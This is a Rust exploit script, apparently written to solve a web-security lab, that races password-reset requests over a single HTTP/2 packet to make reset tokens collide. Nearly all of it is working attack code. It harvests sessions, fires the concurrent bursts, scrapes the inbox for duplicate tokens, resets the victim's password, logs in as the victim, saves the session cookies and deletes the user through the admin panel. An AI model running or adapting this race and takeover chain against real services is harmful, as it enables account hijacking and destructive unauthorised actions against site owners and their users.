#!/usr/bin/env rust-script
//! name: ts8_race
//! description: Time-sensitive reset-token race with INDEPENDENT per-request sessions - harvests one anonymous PHP session (phpsessionid + csrf) per request, fires 1 victim + K attacker /forgot-password POSTs as HTTP/2 streams in ONE packet (each request genuinely its own session, so the app cannot serialise them on a session lock), reads the lab inbox, diffs the freshly issued attacker tokens and reports duplicate groups; on a collision it takes over the victim (reset the password with the shared token, log in as the victim, /admin delete) and reports the banner.
//! version: 1.0.0
//! args: <base-url> --inbox URL [--layout CWWW] [--rounds N] [--victim carlos] [--me wiener] [--new-password S] [--jar FILE] [--wait-secs N] [--no-takeover] [--takeover-token T] [--selftest]
//! keywords: time-sensitive, reset token, race condition, single-packet, h2, independent session, 令牌碰撞, 账户接管
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::{BTreeMap, BTreeSet};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

#[derive(Clone)]
struct Session {
    sid: String,
    csrf: String,
}

#[derive(Clone)]
struct Resp {
    status: u16,
    body: String,
    location: Option<String>,
}

struct Cfg {
    base: String,
    inbox: String,
    layout: String,
    rounds: usize,
    victim: String,
    me: String,
    new_password: String,
    wait_secs: u64,
    takeover: bool,
    takeover_token: String,
    jar_out: String,
}

fn arg(a: &[String], i: usize) -> String {
    a.get(i).cloned().unwrap_or_default()
}

fn main() {
    let _ = tokio_rustls::rustls::crypto::aws_lc_rs::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        base: String::new(),
        inbox: String::new(),
        layout: "CWWW".into(),
        rounds: 1,
        victim: "carlos".into(),
        me: "wiener".into(),
        new_password: "Ts8Hacked!23".into(),
        wait_secs: 12,
        takeover: true,
        takeover_token: String::new(),
        jar_out: String::new(),
    };
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--inbox" => { i += 1; cfg.inbox = arg(&args, i); }
            "--layout" => { i += 1; cfg.layout = arg(&args, i).to_uppercase(); }
            "--rounds" => { i += 1; cfg.rounds = arg(&args, i).parse().unwrap_or(1).max(1); }
            "--victim" => { i += 1; cfg.victim = arg(&args, i); }
            "--me" => { i += 1; cfg.me = arg(&args, i); }
            "--new-password" => { i += 1; cfg.new_password = arg(&args, i); }
            "--wait-secs" => { i += 1; cfg.wait_secs = arg(&args, i).parse().unwrap_or(12); }
            "--jar" => { i += 1; cfg.jar_out = arg(&args, i); }
            "--no-takeover" => cfg.takeover = false,
            "--takeover-token" => { i += 1; cfg.takeover_token = arg(&args, i); }
            other if !other.starts_with("--") && cfg.base.is_empty() => cfg.base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if cfg.base.is_empty() {
        pi_rust_lib::report::failure(
            "ts8_race",
            "need <base-url>",
            "usage: ts8_race https://lab/ --inbox URL [--layout CWWW]",
        );
        std::process::exit(2);
    }
    cfg.base = cfg.base.trim_end_matches('/').to_string();
    if !cfg.layout.chars().any(|c| c == 'W') {
        cfg.layout = "CWWW".into();
    }

    // standalone takeover mode: skip the race, use the supplied token
    if !cfg.takeover_token.is_empty() {
        let out = takeover(&cfg, &cfg.takeover_token);
        pi_rust_lib::report::success("ts8_race", out, "check takeover status and banner").expect("report");
        return;
    }

    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("tokio runtime");
    let mut rounds_log: Vec<Value> = Vec::new();
    let mut takeover_log = Value::Null;
    for round in 1..=cfg.rounds {
        let want = cfg.layout.chars().filter(|c| *c == 'C' || *c == 'W').count();
        let sessions = match harvest(&cfg.base, want) {
            Ok(s) => s,
            Err(e) => {
                pi_rust_lib::report::failure("ts8_race", &format!("harvest round {round}: {e}"), "check base url / instance health");
                std::process::exit(1);
            }
        };
        let before = inbox_rows(&cfg.inbox).unwrap_or_default();

        let parsed = Url::parse(&cfg.base).expect("base url");
        let host = parsed.host_str().unwrap_or("").to_string();
        let port = parsed.port_or_known_default().unwrap_or(443);
        let authority = if port == 443 { host.clone() } else { format!("{host}:{port}") };
        let rows = match rt.block_on(burst(&host, port, &authority, &cfg.layout, &sessions)) {
            Ok(r) => r,
            Err(e) => {
                pi_rust_lib::report::failure("ts8_race", &format!("burst round {round}: {e}"), "check the h2 transport / authority");
                std::process::exit(1);
            }
        };

        // poll the inbox until the attacker emails land or the wait budget is gone
        let expect = cfg.layout.chars().filter(|c| *c == 'W').count();
        let mut fresh: Vec<(String, String)> = Vec::new();
        let t_start = Instant::now();
        loop {
            let after = inbox_rows(&cfg.inbox).unwrap_or_default();
            fresh = new_rows(&before, &after);
            if fresh.len() >= expect {
                break;
            }
            if t_start.elapsed() > Duration::from_secs(cfg.wait_secs) {
                break;
            }
            std::thread::sleep(Duration::from_millis(700));
        }
        let attacker_tokens: Vec<String> = fresh
            .iter()
            .filter(|(u, _)| u == &cfg.me)
            .map(|(_, t)| t.clone())
            .collect();
        let mut uniq: Vec<String> = attacker_tokens.clone();
        uniq.sort();
        uniq.dedup();
        let dup_groups = attacker_tokens.len().saturating_sub(uniq.len());
        rounds_log.push(json!({
            "round": round,
            "sessions": sessions.iter().map(|s| json!({"sid": &s.sid, "csrf": &s.csrf})).collect::<Vec<_>>(),
            "streams": rows,
            "fresh_emails": fresh.iter().map(|(u, t)| json!({"user": u, "token": t})).collect::<Vec<_>>(),
            "attacker_tokens": attacker_tokens,
            "unique_attacker_tokens": uniq.len(),
            "duplicate_groups": dup_groups,
        }));
        if dup_groups == 0 {
            continue;
        }
        // A duplicated attacker token proves two requests were generated at the same
        // instant. The victim's token is then one of this round's distinct tokens, so try
        // each one: the reset form renders only when the server accepts the token for the
        // victim.
        if !cfg.takeover {
            takeover_log = json!({"skipped": true, "candidates": uniq});
            break;
        }
        let mut tries: Vec<Value> = Vec::new();
        let mut accepted = String::new();
        for tk in &uniq {
            let t = takeover(&cfg, tk);
            let form_present = t
                .get("log")
                .and_then(Value::as_array)
                .map(|a| {
                    a.iter().any(|s| {
                        s.get("step") == Some(&json!("open-reset-form")) && s.get("form_present") == Some(&json!(true))
                    })
                })
                .unwrap_or(false);
            tries.push(json!({"token": tk, "token_accepted_for_victim": form_present, "result": t}));
            if form_present {
                accepted = tk.clone();
                break;
            }
        }
        takeover_log = json!({"candidates": uniq, "accepted": accepted, "tries": tries});
        if !accepted.is_empty() {
            break;
        }
    }

    let out = json!({
        "rounds": rounds_log,
        "takeover": takeover_log,
    });
    pi_rust_lib::report::success("ts8_race", out, "duplicate_groups > 0 means the independent-session collision reproduced; takeover.accepted non-empty means the victim shared the token").expect("report");
}

// ---------------------------------------------------------------- harvest

fn harvest(base: &str, n: usize) -> Result<Vec<Session>, String> {
    let agent = ureq::AgentBuilder::new()
        .redirects(0)
        .timeout(Duration::from_secs(20))
        .build();
    let mut out = Vec::new();
    for _ in 0..n {
        let resp = agent
            .get(&format!("{base}/forgot-password"))
            .call()
            .map_err(|e| format!("{e}"))?;
        let set_cookie = resp.all("Set-Cookie").iter().map(|s| s.to_string()).collect::<Vec<_>>();
        let body = resp.into_string().unwrap_or_default();
        let sid = set_cookie
            .iter()
            .find_map(|c| {
                let first = c.split(';').next().unwrap_or("");
                let (k, v) = first.split_once('=')?;
                if k.trim() == "phpsessionid" { Some(v.trim().to_string()) } else { None }
            })
            .ok_or_else(|| "no phpsessionid set-cookie on anonymous /forgot-password".to_string())?;
        let csrf = extract_csrf(&body).ok_or_else(|| "no csrf in /forgot-password body".to_string())?;
        out.push(Session { sid, csrf });
    }
    Ok(out)
}

fn extract_csrf(html: &str) -> Option<String> {
    let key = "name=\"csrf\"";
    let p = html.find(key)?;
    let tail = &html[p..];
    let v = tail.find("value=\"")? + "value=\"".len();
    let rest = &tail[v..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

// ---------------------------------------------------------------- h2 burst

async fn burst(
    host: &str,
    port: u16,
    authority: &str,
    layout: &str,
    sessions: &[Session],
) -> Result<Vec<Value>, String> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut config = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    let connector = TlsConnector::from(Arc::new(config));
    let server_name = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect {host}:{port}: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let mut tls = connector.connect(server_name, tcp).await.map_err(|e| format!("tls: {e}"))?;

    let mut enc = hpack::Encoder::new();
    let mut dec = hpack::Decoder::new();

    // build every request's frames into ONE buffer
    let mut bytes: Vec<u8> = Vec::new();
    bytes.extend_from_slice(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
    bytes.extend_from_slice(&frame(4, 0, 0, &[])); // empty SETTINGS
    let mut sid = 1u32;
    let mut plan: Vec<(u32, String, String)> = Vec::new();
    let chars: Vec<char> = layout.chars().filter(|c| *c == 'C' || *c == 'W').collect();
    for (idx, c) in chars.iter().enumerate() {
        let s = &sessions[idx];
        let user = if *c == 'C' { "carlos" } else { "wiener" };
        let body = format!("csrf={}&username={}", urlenc(&s.csrf), urlenc(user));
        let mut headers: Vec<(Vec<u8>, Vec<u8>)> = Vec::new();
        headers.push((b":method".to_vec(), b"POST".to_vec()));
        headers.push((b":scheme".to_vec(), b"https".to_vec()));
        headers.push((b":authority".to_vec(), authority.as_bytes().to_vec()));
        headers.push((b":path".to_vec(), b"/forgot-password".to_vec()));
        headers.push((b"content-type".to_vec(), b"application/x-www-form-urlencoded".to_vec()));
        headers.push((b"content-length".to_vec(), body.len().to_string().into_bytes()));
        headers.push((b"cookie".to_vec(), format!("phpsessionid={}", s.sid).into_bytes()));
        let block = enc.encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
        bytes.extend_from_slice(&frame(1, 0x4, sid, &block)); // END_HEADERS
        bytes.extend_from_slice(&frame(0, 0x1, sid, body.as_bytes())); // DATA END_STREAM
        plan.push((sid, user.to_string(), body));
        sid += 2;
    }
    let n_bytes = bytes.len();
    let t0 = Instant::now();
    tls.write_all(&bytes).await.map_err(|e| format!("burst write: {e}"))?;
    tls.flush().await.map_err(|e| format!("burst flush: {e}"))?;

    let by_sid = read_status(&mut tls, &mut dec, 4000, t0).await?;
    let mut rows: Vec<Value> = Vec::new();
    for (s, user, body) in &plan {
        let got = by_sid.get(s).cloned().unwrap_or(json!({}));
        let text = got.get("body").and_then(Value::as_str).unwrap_or("").to_string();
        rows.push(json!({
            "stream": s,
            "user": user,
            "body": body,
            "status": got.get("status").cloned().unwrap_or(Value::Null),
            "t_us": got.get("t_us").cloned().unwrap_or(Value::Null),
            "resp_len": text.len(),
            "snippet": text.chars().take(120).collect::<String>(),
        }));
    }
    Ok(vec![json!({
        "burst_bytes": n_bytes,
        "single_packet_likely": n_bytes <= 1200,
        "streams": rows,
    })])
}

async fn read_status<S: AsyncReadExt + AsyncWriteExt + Unpin>(
    stream: &mut S,
    decoder: &mut hpack::Decoder<'_>,
    read_ms: u64,
    t0: Instant,
) -> Result<BTreeMap<u32, Value>, String> {
    let mut by_stream: BTreeMap<u32, Value> = BTreeMap::new();
    let mut pending: BTreeMap<u32, (Vec<u8>, bool)> = BTreeMap::new();
    let idle = Duration::from_millis(read_ms.max(300));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, stream.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 {
            if tokio::time::timeout(idle, stream.read_exact(&mut payload)).await.is_err() {
                break;
            }
        }
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = stream.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = stream.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = stream.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = stream.flush().await;
                }
            }
            1 | 9 => {
                let e = pending.entry(sid).or_insert_with(|| (Vec::new(), false));
                e.0.extend_from_slice(&payload);
                if flags & 0x4 != 0 {
                    e.1 = true;
                }
                if e.1 {
                    let block = e.0.clone();
                    pending.remove(&sid);
                    if let Ok(headers) = decoder.decode(&block) {
                        let status = headers
                            .iter()
                            .find(|(n, _)| n == b":status")
                            .map(|(_, v)| String::from_utf8_lossy(v).to_string());
                        let row = by_stream.entry(sid).or_insert_with(|| json!({"stream": sid, "body": ""}));
                        row["status"] = json!(status);
                        if row.get("t_us").is_none() || row["t_us"].is_null() {
                            row["t_us"] = json!(t0.elapsed().as_micros() as u64);
                        }
                    }
                }
            }
            0 => {
                let row = by_stream.entry(sid).or_insert_with(|| json!({"stream": sid, "body": ""}));
                let prev = row["body"].as_str().unwrap_or("").to_string();
                let mut next = prev;
                next.push_str(&String::from_utf8_lossy(&payload));
                row["body"] = json!(next);
            }
            _ => {}
        }
    }
    Ok(by_stream)
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

// ---------------------------------------------------------------- inbox

/// Rows prepended to the mailbox since `before`. The mailbox lists newest first, so the
/// new rows are a prefix of `after` and `after[k..]` begins with all of `before`; a
/// positional count against a size-capped page silently under-reports (the bug that hid
/// the first reproduced collision).
fn new_rows(before: &[(String, String)], after: &[(String, String)]) -> Vec<(String, String)> {
    if before.is_empty() {
        return after.to_vec();
    }
    for k in 0..=after.len().saturating_sub(before.len()) {
        if after[k..].starts_with(before) {
            return after[..k].to_vec();
        }
    }
    Vec::new()
}

fn inbox_rows(url: &str) -> Result<Vec<(String, String)>, String> {
    let agent = ureq::AgentBuilder::new()
        .redirects(0)
        .timeout(Duration::from_secs(30))
        .build();
    let body = agent.get(url).call().map_err(|e| format!("{e}"))?.into_string().unwrap_or_default();
    let b = body.as_bytes();
    let mut out: Vec<(String, String)> = Vec::new();
    let mut i = 0usize;
    let needle = b"forgot-password?user=";
    while let Some(p) = find_bytes(&b[i..], needle) {
        let mut k = i + p + needle.len();
        let mut user = String::new();
        while k < b.len() && (b[k].is_ascii_alphanumeric() || b[k] == b'_' || b[k] == b'-') {
            user.push(b[k] as char);
            k += 1;
        }
        if k + 1 < b.len() && b[k] == b'&' {
            let mut j = k + 1;
            if b.len() >= j + 4 && &b[j..j + 4] == b"amp;" {
                j += 4;
            }
            if b.len() >= j + 6 && &b[j..j + 6] == b"token=" {
                let tstart = j + 6;
                let mut tok = String::new();
                let mut q = tstart;
                while q < b.len() && tok.len() < 40 && (b[q] as char).is_ascii_hexdigit() {
                    tok.push(b[q] as char);
                    q += 1;
                }
                if tok.len() == 40 && !user.is_empty() {
                    if out.last().map(|(u, t)| u == &user && t == &tok).unwrap_or(false) {
                        // same row's second occurrence (href + anchor text)
                    } else {
                        out.push((user, tok));
                    }
                }
            }
        }
        i = i + p + needle.len();
    }
    Ok(out)
}

fn find_bytes(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    hay.windows(needle.len()).position(|w| w == needle)
}

// ---------------------------------------------------------------- http client

struct Cli {
    agent: ureq::Agent,
    jar: BTreeMap<String, String>,
}

impl Cli {
    fn new() -> Self {
        Cli {
            agent: ureq::AgentBuilder::new()
                .redirects(0)
                .timeout(Duration::from_secs(25))
                .build(),
            jar: BTreeMap::new(),
        }
    }
    fn cookie(&self) -> String {
        self.jar.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join("; ")
    }
    fn absorb(&mut self, set_cookie: &[String]) {
        for c in set_cookie {
            let first = c.split(';').next().unwrap_or("");
            if let Some((k, v)) = first.split_once('=') {
                self.jar.insert(k.trim().to_string(), v.trim().to_string());
            }
        }
    }
    fn req(&mut self, method: &str, url: &str, form: Option<&str>) -> Result<Resp, String> {
        let ck = self.cookie();
        let mut r = if method == "GET" {
            self.agent.get(url)
        } else {
            self.agent.post(url).set("Content-Type", "application/x-www-form-urlencoded")
        };
        if !ck.is_empty() {
            r = r.set("Cookie", &ck);
        }
        let res = match form {
            Some(f) => r.send_string(f),
            None => r.call(),
        };
        let resp = match res {
            Ok(x) => x,
            Err(ureq::Error::Status(_, x)) => x,
            Err(e) => return Err(format!("{e}")),
        };
        let status = resp.status();
        let location = resp.header("Location").map(|s| s.to_string());
        let set_cookie = resp.all("Set-Cookie").iter().map(|s| s.to_string()).collect::<Vec<_>>();
        let body = resp.into_string().unwrap_or_default();
        self.absorb(&set_cookie);
        Ok(Resp { status, body, location })
    }
}

fn urlenc(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

// ---------------------------------------------------------------- takeover

fn takeover(cfg: &Cfg, token: &str) -> Value {
    let mut c = Cli::new();
    let mut log: Vec<Value> = Vec::new();

    // fresh anonymous session to carry the reset POST
    let g = match c.req("GET", &format!("{}/forgot-password", cfg.base), None) {
        Ok(r) => r,
        Err(e) => return json!({"error": format!("get forgot-password: {e}")}),
    };
    log.push(json!({"step": "get-forgot-password", "status": g.status}));

    // open the victim's reset form with the shared token
    let u = format!("{}/forgot-password?user={}&token={}", cfg.base, urlenc(&cfg.victim), urlenc(token));
    let page = match c.req("GET", &u, None) {
        Ok(r) => r,
        Err(e) => return json!({"error": format!("get reset page: {e}"), "log": log}),
    };
    let form_csrf = extract_csrf(&page.body).unwrap_or_default();
    let has_form = page.body.contains("new-password-1");
    log.push(json!({
        "step": "open-reset-form",
        "status": page.status,
        "form_present": has_form,
        "csrf_found": !form_csrf.is_empty(),
        "user_carlos_in_form": page.body.contains("name='user' value='carlos'") || page.body.contains("name=\"user\" value=\"carlos\""),
    }));
    if !has_form {
        return json!({"error": "victim reset form not rendered for this token", "log": log, "snippet": page.body.chars().take(300).collect::<String>()});
    }

    let form = format!(
        "csrf={}&token={}&user={}&new-password-1={}&new-password-2={}",
        urlenc(&form_csrf),
        urlenc(token),
        urlenc(&cfg.victim),
        urlenc(&cfg.new_password),
        urlenc(&cfg.new_password)
    );
    let post = match c.req("POST", &format!("{}/forgot-password", cfg.base), Some(&form)) {
        Ok(r) => r,
        Err(e) => return json!({"error": format!("post reset: {e}"), "log": log}),
    };
    let changed = post.status == 302
        || post.body.contains("Password changed")
        || post.body.contains("password has been changed")
        || post.location.as_deref().map(|l| l.contains("/login") || l.contains("my-account")).unwrap_or(false);
    log.push(json!({
        "step": "post-reset",
        "status": post.status,
        "location": post.location,
        "changed": changed,
        "snippet": post.body.chars().take(200).collect::<String>(),
    }));

    // log in as the victim with the new password
    let login_page = match c.req("GET", &format!("{}/login", cfg.base), None) {
        Ok(r) => r,
        Err(e) => return json!({"error": format!("get login: {e}"), "log": log}),
    };
    let lcsrf = extract_csrf(&login_page.body).unwrap_or_default();
    let lform = format!("csrf={}&username={}&password={}", urlenc(&lcsrf), urlenc(&cfg.victim), urlenc(&cfg.new_password));
    let lg = match c.req("POST", &format!("{}/login", cfg.base), Some(&lform)) {
        Ok(r) => r,
        Err(e) => return json!({"error": format!("post login: {e}"), "log": log}),
    };
    log.push(json!({
        "step": "login",
        "status": lg.status,
        "location": lg.location,
        "session": c.jar.get("phpsessionid").cloned().unwrap_or_default(),
    }));

    // confirm the account page
    let acct = match c.req("GET", &format!("{}/my-account", cfg.base), None) {
        Ok(r) => r,
        Err(e) => return json!({"error": format!("get my-account: {e}"), "log": log}),
    };
    let is_carlos = acct.body.contains("carlos");
    log.push(json!({"step": "my-account", "status": acct.status, "is_carlos": is_carlos}));

    if !cfg.jar_out.is_empty() && is_carlos {
        let jar = json!({ Url::parse(&cfg.base).map(|u| u.host_str().unwrap_or("").to_string()).unwrap_or_default(): c.jar.clone() });
        let _ = std::fs::write(&cfg.jar_out, pi_rust_lib::serde_json::to_string_pretty(&jar).unwrap_or_default());
    }

    // delete the victim through the admin panel
    let admin = c.req("GET", &format!("{}/admin", cfg.base), None).ok();
    let admin_body = admin.as_ref().map(|r| r.body.clone()).unwrap_or_default();
    let admin_ok = admin.as_ref().map(|r| r.status == 200 && r.body.contains("Delete")).unwrap_or(false);
    let key = "delete?username=";
    let del_url = if let Some(p) = admin_body.find(key) {
        let tail = &admin_body[p..];
        let end = tail.find(|ch: char| ch == '\'' || ch == '"' || ch == ' ' || ch == '>').unwrap_or(tail.len());
        Some(format!("{}/admin/{}", cfg.base, &tail[..end]))
    } else {
        Some(format!("{}/admin/delete?username={}", cfg.base, urlenc(&cfg.victim)))
    };
    let mut del_status = Value::Null;
    let mut solved = false;
    if let Some(d) = del_url {
        // The delete rotates the session and the banner only flips on the redirect target,
        // so issue it, then confirm through the banner (retry once when needed).
        for _ in 0..2 {
            if let Ok(r) = c.req("GET", &d, None) {
                del_status = json!(r.status);
                if r.body.contains("is-solved") || r.body.contains("Congratulations") {
                    solved = true;
                    break;
                }
            }
            let b = c.req("GET", &format!("{}/", cfg.base), None).ok();
            let bb = b.as_ref().map(|r| r.body.clone()).unwrap_or_default();
            if bb.contains("is-solved") || bb.contains("Congratulations") {
                solved = true;
                break;
            }
        }
    }
    log.push(json!({"step": "admin-delete", "admin_ok": admin_ok, "delete": del_status}));

    // banner
    let banner = c.req("GET", &format!("{}/", cfg.base), None).ok();
    let bb = banner.as_ref().map(|r| r.body.clone()).unwrap_or_default();
    let solved = solved || bb.contains("is-solved") || bb.contains("Congratulations");

    json!({ "token": token, "log": log, "my_account_is_victim": is_carlos, "banner_solved": solved })
}

// ---------------------------------------------------------------- selftest

fn selftest() {
    let html = "<input required type=\"hidden\" name=\"csrf\" value=\"kycHOpcrgMI0uXcbpmBCYDPvAfaj1xz6\">";
    let ok_csrf = extract_csrf(html).as_deref() == Some("kycHOpcrgMI0uXcbpmBCYDPvAfaj1xz6");
    let f = frame(1, 0x5, 3, b"xy");
    let ok_frame = f.len() == 11 && f[3] == 1 && f[8] == 3;
    let ok_enc = urlenc("a b&c") == "a%20b%26c";
    let before = vec![("wiener".to_string(), "a".to_string()), ("wiener".to_string(), "b".to_string())];
    let after = vec![
        ("wiener".to_string(), "c".to_string()),
        ("wiener".to_string(), "c".to_string()),
        ("wiener".to_string(), "a".to_string()),
        ("wiener".to_string(), "b".to_string()),
    ];
    let fresh = new_rows(&before, &after);
    let ok_diff = fresh.len() == 2 && fresh[0].1 == "c" && fresh[1].1 == "c";
    if ok_csrf && ok_frame && ok_enc && ok_diff {
        pi_rust_lib::report::success("ts8_race", json!({"selftest": "ok"}), "harvest + h2 framing helpers verified").expect("report");
    } else {
        pi_rust_lib::report::failure("ts8_race", "selftest failed", "inspect extract_csrf/frame/urlenc");
        std::process::exit(1);
    }
}

// silence unused import warning for BTreeSet if not used elsewhere
#[allow(dead_code)]
fn _unused(_: BTreeSet<u8>) {}
